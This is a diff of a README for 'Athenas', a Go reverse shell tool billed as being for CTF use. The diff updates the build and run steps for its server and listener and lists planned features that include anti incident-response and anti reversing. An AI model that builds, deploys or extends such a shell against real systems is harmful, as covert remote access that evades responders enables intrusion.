@@ -47,17 +47,22 @@ proxychains4 attacker.rb
 =========================
         GOLANG:
 =========================
-go build aaa.go
+go build -o server server.go
+./server
 
-./file --server <server> --port <port>
+#Listener 
+
+go build -o listener listener.go
+./listener
+#  -server string
+#        initial server:port address (default "127.0.0.1:8080")
 
 ```
-![image1](https://github.com/Lowkkii/Athenas/blob/main/main.png)
 ### soon:
 * Binary files.
 * anti incident-response.
 * anti reversing.
-* 
+  
 # Disclaimer
 A perfect reverse shell for CTF's.
 
